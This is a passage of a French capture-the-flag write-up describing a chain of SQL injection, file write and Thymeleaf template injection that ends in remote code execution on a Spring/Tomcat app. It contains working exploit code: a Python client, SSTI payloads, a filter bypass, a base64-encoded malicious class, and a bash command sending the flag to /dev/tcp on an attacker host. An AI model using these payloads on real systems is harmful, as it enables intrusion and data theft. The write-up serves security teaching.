+<p>Heuresement pour nous, en cherchant dans le code de <em>thymeleaf</em>, <a href="https://github.com/thymeleaf/thymeleaf-spring/blob/74c4203bd5a2935ef5e571791c7f286e628b6c31/thymeleaf-spring3/src/main/java/org/thymeleaf/spring3/view/ThymeleafView.java#L277" target="_blank">ici</a> précisement, on se rend compte que le nom de la template qu&rsquo;il va rechercher est d&rsquo;abord rendu par le moteur de template !<br>
+La condition pour le nom de la template soit évaluer est qu&rsquo;il contienne <code>::</code></p>
+<p><strong>On peut donc utiliser l&rsquo;injection SQL pour écrire un fichier contenant une SSTI et faire pointer <em>thymeleaf</em> vers ce fichier afin que le contenu soit évaluer !</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>c <span style="color:#f92672">=</span> client(url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&lt;ip&gt;:8080&#39;</span>)
+</span></span><span style="display:flex;"><span>admin_passwd <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span>leak_admin_password()
+</span></span><span style="display:flex;"><span>c<span style="color:#f92672">.</span>login(<span style="color:#e6db74">&#39;admin&#39;</span>, admin_passwd)
+</span></span><span style="display:flex;"><span>c<span style="color:#f92672">.</span>file_write(
+</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;__${7*7}__::.x&#39;</span>,
+</span></span><span style="display:flex;"><span>    path<span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/tmp/rce&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>c<span style="color:#f92672">.</span>notify(payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;..</span><span style="color:#e6db74">%5c</span><span style="color:#e6db74">tmp/rce</span><span style="color:#e6db74">%3F</span><span style="color:#e6db74">&#39;</span>)
+</span></span></code></pre></div><p>On obtient bien dans les logs docker:</p>
+<pre tabindex="0"><code>Error resolving template [49], template might not exist or might not be accessible by any of the configured Template Resolvers
+</code></pre><p><img src="./img/screen9.png" alt="Alt text"></p>
+<h3 id="ssti-to-rce">SSTI to RCE</h3>
+<p>Maintenant que nous avons notre injection de template, nous devons trouver un moyen d&rsquo;éxécuter du code.</p>
+<p>Beaucoup de choses ont été testées, comme par exemple l&rsquo;utilisation de <code>T(java.lang.Runtime).getRuntime()</code> ou encore la librairie vulnérable <code>SnakeYaml</code>. Aucune de ces tentatives n&rsquo;a fonctionné&hellip;</p>
+<p>Finalement, nous avons utilisé <code>strace</code> pour regarder les appels système fait pas le serveur WEB:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt install strace
+</span></span><span style="display:flex;"><span>sudo strace -fie file -p <span style="color:#66d9ef">$(</span>pidof -s java<span style="color:#66d9ef">)</span>
+</span></span></code></pre></div><p>Le serveur tenté de charger des class depuis un dossier de <em>/tmp</em>: <code>/tmp/tomcat-docbase.8080.4797479350720433534/WEB-INF/classes/</code>:</p>
+<pre tabindex="0"><code>[pid    80] [00007fb0552b43a6] stat(&#34;/tmp/tomcat-docbase.8080.4797479350720433534/WEB-INF/classes&#34;, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+</code></pre><p>L&rsquo;idée est la suivante:</p>
+<ul>
+<li>Ecrire une class malveillante dans <strong>/tmp/Tfns.class</strong></li>
+<li>Utiliser la SQLI pour trouver le dossier tomcat</li>
+<li>Créer un dossier <strong>/tmp/tomcat-docbase.8080.4797479350720433534/WEB-INF/classes/</strong></li>
+<li>Copier <strong>/tmp/Tfns.class</strong> dans le dossier créer</li>
+<li>Charger la class</li>
+</ul>
+<p>On peut récuperer le nom du dossier sur le serveur de la manière suivante:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">client</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, url):
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">file_list</span>(self, path):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>sqli(query<span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;SELECT pg_ls_dir(&#39;</span><span style="color:#e6db74">{</span>path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> client(url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&lt;ip&gt;:8080&#39;</span>)
+</span></span><span style="display:flex;"><span>admin_passwd <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span>leak_admin_password()
+</span></span><span style="display:flex;"><span>c<span style="color:#f92672">.</span>login(<span style="color:#e6db74">&#39;admin&#39;</span>, admin_passwd)
+</span></span><span style="display:flex;"><span>c<span style="color:#f92672">.</span>file_list(<span style="color:#e6db74">&#39;./../../../../../tmp&#39;</span>)
+</span></span></code></pre></div><p><img src="./img/screen10.png" alt="Alt text"></p>
+<h4 id="bypass-de-la-fonction-safecheck">Bypass de la fonction <em>safeCheck</em></h4>
+<p>La fonction <em>safeCheck</em> nous empêche d&rsquo;avoir un payload contenant:</p>
+<ul>
+<li>&ldquo;org.spring&rdquo;</li>
+<li>&ldquo;org.apache&rdquo;</li>
+<li>&ldquo;&lt;&rdquo;</li>
+<li>&ldquo;&gt;&rdquo;</li>
+</ul>
+<p>Pour récuperer des class provenant de &ldquo;org.apache&rdquo; ou &ldquo;org.spring&rdquo;, nous pouvons utiliser cette technique:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;</span>.getClass<span style="color:#f92672">()</span>.forName<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.&#34;</span>+<span style="color:#e6db74">&#34;apache.catalina.startup.ExpandWar&#34;</span><span style="color:#f92672">)</span>
+</span></span></code></pre></div><h4 id="création-du-répertoire">Création du répertoire</h4>
+<p>La class <em>FileUtils</em> de <em>&ldquo;org.apache.tomcat.util.http.fileupload</em> a était utilisé avec la méthode: <code>forceMkdir</code></p>
+<h4 id="copy-du-fichier">Copy du fichier</h4>
+<p>La class <em>ExpandWar</em> de <em>&ldquo;org.apache.catalina.startup.ExpandWar</em> avec la méthode <code>copy</code> à permit de déplacer le fichier</p>
+<h4 id="chargement-de-la-class-et-rce">Chargement de la class et RCE</h4>
+<p>Enfin la méthode loadClass de <em>&ldquo;ch.qos.logback.core.util.Loader&rdquo;</em> a permis de charger la class malveillante et de RCE !</p>
+<p><em>(Note: C&rsquo;est Tomcat qui a créé le dossier, c&rsquo;est pour cela qu&rsquo;une copie du fichier malveillant par le serveur web était nécessaire au lieu de directement l&rsquo;écrire au bon endroit)</em></p>
+<p>Voici la class malveillante:</p>
+<ul>
+<li>tfns.java</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Tfns</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">pwn</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            String<span style="color:#f92672">[]</span> cmd <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;/readflag &gt; /dev/tcp/&lt;ip&gt;/3333&#34;</span>};
+</span></span><span style="display:flex;"><span>            Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(cmd);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span>(IOException e) {
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>javac tfns.java
+</span></span><span style="display:flex;"><span>cat tfns.class| base64
+</span></span></code></pre></div><p>et :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>c <span style="color:#f92672">=</span> client(url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&lt;ip&gt;:8080&#39;</span>)
+</span></span><span style="display:flex;"><span>admin_passwd <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span>leak_admin_password()
+</span></span><span style="display:flex;"><span>c<span style="color:#f92672">.</span>login(<span style="color:#e6db74">&#39;admin&#39;</span>, admin_passwd)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload_class <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">yv66vgAAAD0AIwoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClW
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">BwAIAQAQamF2YS9sYW5nL1N0cmluZwgACgEACS9iaW4vYmFzaAgADAEAAi1jCAAOAQAoL3JlYWRm
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">bGFnID4gL2Rldi90Y3AvMTc2LjE0My4xMDIuNDcvMzMzMwoAEAARBwASDAATABQBABFqYXZhL2xh
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">bmcvUnVudGltZQEACmdld          [REDACTED]          QAAMACQAfAAYAAQAdAAAAXgAE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">AAEAAAAhBr0AB1kDEglTWQQSC1NZBRINU0u4AA8qtgAVV6cABEuxAAEAAAAcAB8AGQACAB4AAAAW
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">AAUAAAAHABQACAAcAAoAHwAJACAACwAgAAAABwACXwcAGQAAAQAhAAAAAgAi
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c<span style="color:#f92672">.</span>file_write(
+</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">=</span>payload_class,
+</span></span><span style="display:flex;"><span>    path<span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/tmp/Tfns.class&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>all_payloads <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;.getClass().forName(&#34;org.&#34;+&#34;apache.tomcat.util.http.fileupload.FileUtils&#34;).forceMkdir(
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;/tmp/tomcat-docbase.8080.4797479350720433534/WEB-INF/classes/&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip(),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;.getClass().forName(&#34;org.&#34;+&#34;apache.catalina.startup.ExpandWar&#34;).copy(
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;/tmp/Tfns.class&#34;,&#34;/tmp/tomcat-docbase.8080.4797479350720433534/WEB-INF/classes/Tfns.class&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip(),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;.getClass().forName(&#34;ch.qos.logback.core.util.Loader&#34;).loadClass(&#34;Tfns&#34;).pwn()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip(),
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> payload <span style="color:#f92672">in</span> all_payloads:
+</span></span><span style="display:flex;"><span>    c<span style="color:#f92672">.</span>file_write(
+</span></span><span style="display:flex;"><span>        data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;__${</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">}__::.x&#34;</span><span style="color:#f92672">%</span> payload,
+</span></span><span style="display:flex;"><span>        path<span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/tmp/rce&#34;</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    c<span style="color:#f92672">.</span>notify(payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;..</span><span style="color:#e6db74">%5c</span><span style="color:#e6db74">tmp/rce</span><span style="color:#e6db74">%3F</span><span style="color:#e6db74">&#39;</span>)
+</span></span></code></pre></div><p>Et enfin:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">3333</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">3333</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>&lt;IP&gt;<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>&lt;IP&gt;<span style="color:#f92672">]</span> <span style="color:#ae81ff">56874</span>
+</span></span><span style="display:flex;"><span>rwctf<span style="color:#f92672">{</span>b2ed2442-b9e0-11ee-a668-00163e01b905<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="références">Références:</h2>
+<ul>
+<li><a href="https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability" target="_blank">Veracode - Spring View Manipulation Vulnerability</a></li>
+<li><a href="https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/" target="_blank">Acunetix - Exploiting ssti in thymeleaf</a></li>
+<li><a href="https://ret2school.github.io/post/localization_is_hard_wu/" target="_blank">AeroCTF - Localization is hard</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#thymeleaf-java" target="_blank">Hacktricks</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" target="_blank">PayloadsAllTheThings - PostgreSQL injection</a></li>
+<li><a href="https://www.postgresql.org/docs/8.1/sql-syntax.html" target="_blank">Postgresql docs</a></li>
+</ul>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="//localhost:1313/writeups/yeswehack_dojo_23/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Writeup 5Ways2XSS - DOJO #23 | YesWeHack</a>
+        
+	    
+            <div class="next-post">
+                <a href="//localhost:1313/writeups/twisty-python-fcsc2024-en/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Twisty Python [EN]| FCSC 2024</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#fichiers">Fichiers:</a></li>
+    <li><a href="#description">Description:</a></li>
+    <li><a href="#solution-détaillée">Solution détaillée:</a>
+      <ul>
+        <li><a href="#première-vulnérabilité-injection-sql">Première vulnérabilité: Injection SQL</a></li>
+        <li><a href="#seconde-vulnérabilité-lecture-et-ecriture-de-fichier-arbitraire">Seconde vulnérabilité: Lecture et Ecriture de fichier arbitraire</a></li>
+        <li><a href="#troisième-vulnérabilité-injection-de-template">Troisième vulnérabilité: Injection de template</a></li>
+        <li><a href="#ssti-to-rce">SSTI to RCE</a></li>
+      </ul>
+    </li>
+    <li><a href="#références">Références:</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
